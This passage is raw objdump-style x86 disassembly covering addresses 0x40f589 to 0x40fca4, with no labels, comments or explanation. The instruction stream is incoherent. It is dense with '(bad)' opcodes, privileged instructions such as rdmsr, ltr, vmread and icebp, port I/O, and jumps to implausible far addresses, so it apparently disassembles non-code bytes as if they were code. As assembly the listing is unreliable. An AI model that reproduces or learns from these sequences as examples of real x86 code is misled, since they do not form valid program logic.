  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
